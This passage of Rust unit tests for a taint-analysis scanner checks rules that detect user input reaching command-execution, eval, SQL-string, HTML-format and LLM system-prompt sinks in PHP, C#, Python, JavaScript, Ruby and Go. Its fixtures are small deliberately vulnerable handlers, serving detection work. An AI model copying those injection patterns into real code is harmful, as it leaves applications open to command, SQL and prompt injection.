    // We assert the sink line and that a sanitized variant produces no finding.

    /// `$_GET['cmd'] → system($c)` via the bare-identifier `$_GET` source.
    #[test]
    fn php_bridge_bare_get_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-get-cmdi
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = "<?php\nfunction handle() {\n  $c = $_GET['cmd'];\n  system($c);\n}\n";
        let tree = parse_file(src, Language::Php).expect("PHP fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for $_GET['cmd'] -> system, got {:?}",
            findings
        );
        assert_eq!(
            findings[0].line, 4,
            "finding should be at the system() sink line"
        );
    }

    /// A sanitizer (escapeshellarg) between a bare-identifier `$_GET` source
    /// and the sink blocks the flow end-to-end.
    #[test]
    fn php_bridge_bare_get_source_sanitized_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-get-cmdi-sanitized
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET
pattern-sanitizers:
  - pattern: escapeshellarg($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src =
            "<?php\nfunction handle() {\n  $c = escapeshellarg($_GET['cmd']);\n  system($c);\n}\n";
        let tree = parse_file(src, Language::Php).expect("PHP fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "sanitized $_GET flow must produce no finding, got {:?}",
            findings
        );
    }

    /// Near-miss: `$_GET` is assigned but the literal `'ls'` is passed to the
    /// sink — must produce no finding.
    #[test]
    fn php_bridge_bare_get_source_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-get-cmdi-nearmiss
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = "<?php\nfunction handle() {\n  $tainted = $_GET['cmd'];\n  $safe = 'ls';\n  system($safe);\n}\n";
        let tree = parse_file(src, Language::Php).expect("PHP fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "untainted argument must not fire, got {:?}",
            findings
        );
    }

    /// PHP taint rule with `languages: [php]` compiles cleanly.
    #[test]
    fn taint_rule_with_php_language_compiles() {
        let yaml = r#"
id: php-taint
mode: taint
languages: [php]
severity: ERROR
message: m
pattern-sources: [{pattern: $_GET}]
pattern-sinks: [{pattern: system($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Php);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    // ─── Bridge-level (end-to-end) tests for C# taint engine ─────────────────
    //
    // These compile a rule through `parse_taint_rule` (the SAME path the CLI
    // uses) and run it against real C# source via the bridge. We test the
    // primary dotted-source shapes that arrive as `Attribute` / `Call` matchers
    // through the bridge (not `ParamName`, since C# sources are dotted).

    /// `Request.QueryString["cmd"] → Process.Start(cmd)` fires end-to-end.
    #[test]
    fn csharp_bridge_dotted_source_to_process_start_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-cmd-injection
mode: taint
languages: [csharp]
severity: ERROR
message: "Tainted input reaches Process.Start"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: Request.QueryString
pattern-sinks:
  - pattern: Process.Start($X)
"#,
        );

        let src = r#"
using System.Web;
using System.Diagnostics;

class Controller {
    public void Handle() {
        string cmd = Request.QueryString["cmd"];
        Process.Start(cmd);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for Request.QueryString -> Process.Start, got {:?}",
            findings
        );
        assert!(
            findings[0].line > 0,
            "finding should carry a valid line number"
        );
    }

    /// Sanitized variant: `HttpUtility.HtmlEncode(raw)` blocks XSS.
    #[test]
    fn csharp_bridge_sanitized_variant_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-xss-sanitized
mode: taint
languages: [csharp]
severity: ERROR
message: "Tainted input reaches Response.Write"
pattern-sources:
  - pattern: Request.QueryString
pattern-sanitizers:
  - pattern: HttpUtility.HtmlEncode($X)
pattern-sinks:
  - pattern: Response.Write($X)
"#,
        );

        let src = r#"
using System.Web;

class Controller {
    public void Handle() {
        string raw = Request.QueryString["q"];
        string safe = HttpUtility.HtmlEncode(raw);
        Response.Write(safe);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "sanitized flow must produce no finding, got {:?}",
            findings
        );
    }

    /// Near-miss: tainted variable not passed to the sink → no finding.
    #[test]
    fn csharp_bridge_near_miss_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-cmd-nearmiss
mode: taint
languages: [csharp]
severity: ERROR
message: "Tainted input reaches Process.Start"
pattern-sources:
  - pattern: Request.QueryString
pattern-sinks:
  - pattern: Process.Start($X)
"#,
        );

        // tainted is assigned but a literal "notepad.exe" is passed to the sink.
        let src = r#"
using System.Web;
using System.Diagnostics;

class Controller {
    public void Handle() {
        string _tainted = Request.QueryString["cmd"];
        Process.Start("notepad.exe");
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "near-miss must produce no finding, got {:?}",
            findings
        );
    }

    /// `csharp` language alias parses correctly.
    #[test]
    fn taint_rule_with_csharp_language_compiles() {
        let yaml = r#"
id: cs-taint
mode: taint
languages: [csharp]
severity: ERROR
message: m
pattern-sources: [{pattern: Request.QueryString}]
pattern-sinks: [{pattern: Process.Start($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::CSharp);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    /// `cs` alias compiles as C#.
    #[test]
    fn taint_rule_with_cs_alias_compiles_as_csharp() {
        let yaml = r#"
id: cs-taint
mode: taint
languages: [cs]
severity: ERROR
message: m
pattern-sources: [{pattern: Request.QueryString}]
pattern-sinks: [{pattern: Process.Start($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::CSharp),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    /// `Console.ReadLine()` → `Process.Start()` fires via Call source.
    #[test]
    fn csharp_bridge_console_readline_to_process_start() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-console-cmdi
mode: taint
languages: [csharp]
severity: ERROR
message: "Console.ReadLine input reaches Process.Start"
pattern-sources:
  - pattern: Console.ReadLine($X)
pattern-sinks:
  - pattern: Process.Start($X)
"#,
        );

        let src = r#"
using System;
using System.Diagnostics;

class App {
    static void Main() {
        string cmd = Console.ReadLine();
        Process.Start(cmd);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for Console.ReadLine -> Process.Start, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: FieldName (any-receiver property read source) ────
    //
    // These compile a rule with a `$METAVAR.field` source through the SAME
    // `parse_taint_rule` path the CLI uses, then run the compiled rule against
    // a real vulnerable source string and assert it FIRES — proving the new
    // shape is wired end-to-end through the bridge AND the engine. A safe
    // variant (no tainted property read) must NOT fire.

    /// Python: `$REQ.body` source → `os.system` sink. `req.body` is a property
    /// read on a metavariable receiver — only `FieldName` can express it.
    #[test]
    fn python_bridge_fieldname_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-fieldname-cmdi
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request body reaches os.system"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - pattern: os.system($X)
"#,
        );
        // FieldName compiles a property read of `.body`.
        assert!(matches!(
            rule.spec.sources.as_slice(),
            [GenericMatcher::FieldName { field, .. }] if field == "body"
        ));

        let src = r#"
def handler(req):
    data = req.body
    os.system(data)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.body -> os.system, got {:?}",
            findings
        );
    }

    /// Python safe variant: a value that is NOT the `.body` property read must
    /// not be flagged, proving FieldName is field-specific (not "any read").
    #[test]
    fn python_bridge_fieldname_safe_property_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-fieldname-cmdi-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request body reaches os.system"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - pattern: os.system($X)
"#,
        );

        let src = r#"
def handler(req):
    data = req.session
    os.system(data)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "req.session is not `.body`; expected no finding, got {:?}",
            findings
        );
    }

    /// JavaScript: `$REQ.query` source → `eval` sink, exercising the JS
    /// `member_expression` FieldName path through the bridge.
    #[test]
    fn javascript_bridge_fieldname_source_to_eval_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-fieldname-eval
mode: taint
languages: [javascript]
severity: ERROR
message: "Tainted req.query reaches eval"
pattern-sources:
  - pattern: $REQ.query
pattern-sinks:
  - pattern: eval($X)
"#,
        );

        let src = r#"
function handler(req) {
    const q = req.query;
    eval(q);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.query -> eval, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Subscript (index/subscript access source) ────────

    /// Python: `request.POST[...]` source → `os.system` sink. The subscript
    /// base's final segment is `POST`.
    #[test]
    fn python_bridge_subscript_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-subscript-cmdi
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request.POST reaches os.system"
pattern-sources:
  - pattern: request.POST[...]
pattern-sinks:
  - pattern: os.system($X)
"#,
        );
        assert!(matches!(
            rule.spec.sources.as_slice(),
            [GenericMatcher::Subscript { base: Some(b), .. }] if b == "POST"
        ));

        let src = r#"
def handler(request):
    cmd = request.POST["c"]
    os.system(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for request.POST[...] -> os.system, got {:?}",
            findings
        );
    }

    /// Python safe variant: a subscript on a different base (`safe[...]`)
    /// must not fire when the rule wants `request.POST[...]`.
    #[test]
    fn python_bridge_subscript_safe_base_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-subscript-cmdi-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request.POST reaches os.system"
pattern-sources:
  - pattern: request.POST[...]
pattern-sinks:
  - pattern: os.system($X)
"#,
        );

        let src = r#"
def handler(config):
    cmd = config.SETTINGS["c"]
    os.system(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "config.SETTINGS[...] is not request.POST[...]; expected no finding, got {:?}",
            findings
        );
    }

    /// PHP: `$_GET[...]` subscript source → `system` sink via the bridge.
    #[test]
    fn php_bridge_subscript_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-subscript-cmdi
mode: taint
languages: [php]
severity: ERROR
message: "Tainted $_GET reaches system"
pattern-sources:
  - pattern: $_GET[...]
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"<?php
function handler() {
    $cmd = $_GET["c"];
    system($cmd);
}
"#;
        let tree = parse_file(src, Language::Php).expect("php fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for $_GET[...] -> system, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: ReceiverCall (`receiver.$METHOD(...)` sink) ──────

    /// Python: `request.args` source → `os.$METHOD(...)` sink. The sink is a
    /// metavariable method on a concrete `os` receiver — only `ReceiverCall`
    /// can express it.
    #[test]
    fn python_bridge_receivercall_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-receivercall-cmdi
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request reaches os.<any>"
pattern-sources:
  - pattern: $REQ.cmd
pattern-sinks:
  - pattern: os.$METHOD(...)
"#,
        );
        assert!(matches!(
            rule.spec.sinks.as_slice(),
            [GenericMatcher::ReceiverCall { receiver, .. }] if receiver == "os"
        ));

        let src = r#"
def handler(req):
    c = req.cmd
    os.system(c)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.cmd -> os.system (os.$METHOD), got {:?}",
            findings
        );
    }

    /// Python safe variant: a call on a DIFFERENT receiver (`safe.run`) must
    /// not be flagged when the rule wants `os.$METHOD(...)`.
    #[test]
    fn python_bridge_receivercall_other_receiver_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-receivercall-cmdi-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request reaches os.<any>"
pattern-sources:
  - pattern: $REQ.cmd
pattern-sinks:
  - pattern: os.$METHOD(...)
"#,
        );

        let src = r#"
def handler(req):
    c = req.cmd
    logger.info(c)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "logger.info is not os.$METHOD; expected no finding, got {:?}",
            findings
        );
    }

    /// Ruby: bare `params` source → `Kernel.$X(...)` ReceiverCall sink.
    #[test]
    fn ruby_bridge_receivercall_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-receivercall-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches Kernel.<any>"
pattern-sources:
  - pattern: params
pattern-sinks:
  - pattern: Kernel.$X(...)
"#,
        );

        let src = r#"
def handler
  cmd = params[:cmd]
  Kernel.system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for params -> Kernel.system (Kernel.$X), got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: BinopFormat (`"$SQL" + $X` / f-string sink) ──────

    /// Python: `request.args` source → `"$SQLSTR" + ...` concatenation sink.
    /// The sink is a string-building binary `+` — only `BinopFormat` can
    /// express it.
    #[test]
    fn python_bridge_binop_format_concat_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-sqli
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::BinopFormat { .. }]
            ),
            "sink should compile to BinopFormat, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def handler(req):
    name = req.args
    query = "SELECT * FROM t WHERE n = " + name
    db.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.args -> \"...\" + name, got {:?}",
            findings
        );
    }

    /// Python safe variant: a literal-only concatenation with NO tainted
    /// operand must not fire, proving `BinopFormat` is not over-broad.
    #[test]
    fn python_bridge_binop_format_untainted_concat_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-sqli-safe
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );

        let src = r#"
def handler(req):
    name = req.args
    query = "SELECT * FROM t WHERE n = " + "constant"
    db.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal-only concat has no tainted operand; expected no finding, got {:?}",
            findings
        );
    }

    /// Python: f-string interpolation sink `f"...{$X}..."` with a tainted
    /// interpolated value fires.
    #[test]
    fn python_bridge_binop_format_fstring_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-fstring-sqli
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into an f-string SQL"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: 'f"...{$X}..."'
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::BinopFormat { .. }]
            ),
            "f-string sink should compile to BinopFormat, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def handler(req):
    name = req.args
    query = f"SELECT * FROM t WHERE n = {name}"
    db.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.args -> f-string, got {:?}",
            findings
        );
    }

    /// Python: percent-format sink `"$HTMLSTR" % ...` with a tainted operand
    /// fires (old-style string formatting).
    #[test]
    fn python_bridge_binop_format_percent_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-binop-percent-html
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request flows into a percent-formatted string"
pattern-sources:
  - pattern: $REQ.args
pattern-sinks:
  - pattern: '"$HTMLSTR" % ...'
"#,
        );

        let src = r#"
def handler(req):
    name = req.args
    page = "<b>%s</b>" % name
    render(page)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.args -> \"...\" % name, got {:?}",
            findings
        );
    }

    /// Go: a request field-read source → `"$SQLSTR" + ...` concat sink.
    /// Confirms the Go engine matches `BinopFormat` on `binary_expression`.
    #[test]
    fn go_bridge_binop_format_concat_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: go-binop-sqli
mode: taint
languages: [go]
severity: ERROR
message: "Tainted request value flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.Body
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::BinopFormat { .. }]
            ),
            "go sink should compile to BinopFormat, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
package main

func handler(r *Request) {
    name := r.Body
    query := "SELECT * FROM t WHERE n = " + name
    db.Exec(query)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for r.Body -> \"...\" + name, got {:?}",
            findings
        );
    }

    /// Go safe variant: a literal-only concatenation with no tainted operand
    /// must not fire.
    #[test]
    fn go_bridge_binop_format_untainted_concat_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: go-binop-sqli-safe
mode: taint
languages: [go]
severity: ERROR
message: "Tainted request value flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.Body
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );

        let src = r#"
package main

func handler(r *Request) {
    _ = r.Body
    query := "SELECT * FROM t WHERE n = " + "constant"
    db.Exec(query)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal-only concat has no tainted operand; expected no finding, got {:?}",
            findings
        );
    }

    // ── CALL-ON-MEMBER bridge (end-to-end) tests ─────────────────────────────
    //
    // A method call whose receiver is a member-access chain with a metavar root
    // (e.g. `$CLIENT.chat.completions.create(...)`) is compiled to a FieldName
    // on the penultimate field (`completions`). The engine taints that member
    // read; the trailing `.create(...)` propagates the taint. These go through
    // `parse_taint_rule` → `check`, the same path the CLI uses, on a real
    // fixture wrapped in a function (taint engines analyze inside functions).

    /// Python: `$CLIENT.chat.completions.create(...)` LLM-output source flows
    /// into `eval(...)` and fires. Mirrors `llm-output-to-exec-python`.
    #[test]
    fn python_bridge_member_call_llm_source_to_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-llm-output-to-exec
mode: taint
languages: [python]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.chat.completions.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );
        assert!(
            matches!(rule.spec.sources.as_slice(), [GenericMatcher::FieldName { field, .. }] if field == "completions"),
            "source should compile to FieldName{{completions}}, got {:?}",
            rule.spec.sources
        );

        let src = r#"
def run(client):
    out = client.chat.completions.create(model="gpt-4")
    eval(out)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for completions.create -> eval, got {:?}",
            findings
        );
    }

    /// Python near-miss: a DIFFERENT penultimate field (`other.create`) must
    /// NOT be tainted, so no finding fires.
    #[test]
    fn python_bridge_member_call_different_field_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-llm-output-to-exec
mode: taint
languages: [python]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.chat.completions.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );

        let src = r#"
def run(client):
    out = client.chat.other.create(model="gpt-4")
    eval(out)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "different penultimate field must not taint; expected no finding, got {:?}",
            findings
        );
    }

    /// JavaScript: `$CLIENT.messages.create(...)` flows into `eval(...)`.
    /// Mirrors `llm-output-to-exec-javascript`.
    #[test]
    fn javascript_bridge_member_call_llm_source_to_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-llm-output-to-exec
mode: taint
languages: [javascript]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.messages.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );
        assert!(
            matches!(rule.spec.sources.as_slice(), [GenericMatcher::FieldName { field, .. }] if field == "messages"),
            "source should compile to FieldName{{messages}}, got {:?}",
            rule.spec.sources
        );

        let src = r#"
function run(client) {
    const out = client.messages.create({model: "claude"});
    eval(out);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for messages.create -> eval, got {:?}",
            findings
        );
    }

    /// JavaScript near-miss: a different penultimate field does not fire.
    #[test]
    fn javascript_bridge_member_call_different_field_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-llm-output-to-exec
mode: taint
languages: [javascript]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.messages.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );

        let src = r#"
function run(client) {
    const out = client.completions.create({model: "claude"});
    eval(out);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "different penultimate field must not taint; expected no finding, got {:?}",
            findings
        );
    }

    // ── Concrete-root metavar-field bridge tests: `request.$ANYTHING` ────────
    //
    // A concrete request root with a wildcard field (`request.$ANYTHING`) is
    // compiled to a `ParamName` source on the root `request`; the engine then
    // taints every attribute read on that root. Mirrors the Django
    // `tainted-sql-string` / `tainted-url-host` / `raw-html-format` rules.

    #[test]
    fn compile_concrete_root_metavar_field_yields_paramname_root() {
        let m = compile("request.$ANYTHING", MatcherRole::Source).expect("request source");
        match m {
            GenericMatcher::ParamName { names, .. } => {
                assert_eq!(names, vec!["request".to_string()])
            }
            other => panic!("expected ParamName[request], got {other:?}"),
        }
        // Metavar root is rejected (too broad).
        assert!(parse_concrete_root_metavar_field("$REQ.$ANYTHING").is_none());
        // Concrete field is NOT this shape (it is a plain Attribute).
        assert!(parse_concrete_root_metavar_field("request.GET").is_none());
        // Three segments rejected.
        assert!(parse_concrete_root_metavar_field("a.b.$X").is_none());
    }

    /// Python: `request.$ANYTHING` source flows into a `"..." + ...` SQL string
    /// and fires. Mirrors `tainted-sql-string` (django).
    #[test]
    fn python_bridge_request_anything_source_to_binop_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-django-tainted-sql
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request attribute reaches a built SQL string"
pattern-sources:
  - pattern: request.$ANYTHING
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );
        assert!(
            matches!(rule.spec.sources.as_slice(), [GenericMatcher::ParamName { names, .. }] if names == &["request".to_string()]),
            "source should compile to ParamName[request], got {:?}",
            rule.spec.sources
        );

        let src = r#"
def view(request):
    name = request.GET
    query = "SELECT * FROM t WHERE n = " + name
    cursor.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for request.GET -> \"...\" + name, got {:?}",
            findings
        );
    }

    /// Python near-miss: a non-request root (`config.GET`) is NOT a source, so a
    /// literal-built string from it does not fire.
    #[test]
    fn python_bridge_request_anything_non_request_root_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-django-tainted-sql
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request attribute reaches a built SQL string"
pattern-sources:
  - pattern: request.$ANYTHING
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );

        let src = r#"
def view(config):
    name = config.GET
    query = "SELECT * FROM t WHERE n = " + name
    cursor.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "non-request root must not be a source; expected no finding, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: ObjectLiteralValue (LLM system-prompt sink) ──────

    /// Python: `request.data` source → `{"role": "system", "content": $SINK}`
    /// dict-literal sink. Only `ObjectLiteralValue` can express a dict-literal
    /// whose value position carries the tainted value.
    #[test]
    fn python_bridge_object_literal_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-objlit-prompt-injection
mode: taint
languages: [python]
severity: ERROR
message: "User input flows into a system-prompt dict literal"
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern: |
          {"role": "system", "content": $SINK}
      - focus-metavariable: $SINK
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::ObjectLiteralValue { .. }]
            ),
            "sink should compile to ObjectLiteralValue, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def handler():
    user = request.data
    msg = {"role": "system", "content": user}
    return msg
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for request.data -> dict literal value, got {:?}",
            findings
        );
    }

    /// Python near-miss: a dict literal with only literal values must NOT fire.
    #[test]
    fn python_bridge_object_literal_clean_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-objlit-prompt-injection-safe
mode: taint
languages: [python]
severity: ERROR
message: "User input flows into a system-prompt dict literal"
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern: |
          {"role": "system", "content": $SINK}
      - focus-metavariable: $SINK
"#,
        );

        let src = r#"
def handler():
    user = request.data
    msg = {"role": "system", "content": "you are a helpful assistant"}
    return msg
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a dict literal with only literal values must not fire, got {:?}",
            findings
        );
    }

    /// JavaScript: `req.body` source → `{role: "system", content: $SINK}`
    /// object-literal sink.
    #[test]
    fn javascript_bridge_object_literal_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-objlit-prompt-injection
mode: taint
languages: [javascript, typescript]
severity: ERROR
message: "User input flows into a system-prompt object literal"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - pattern: |
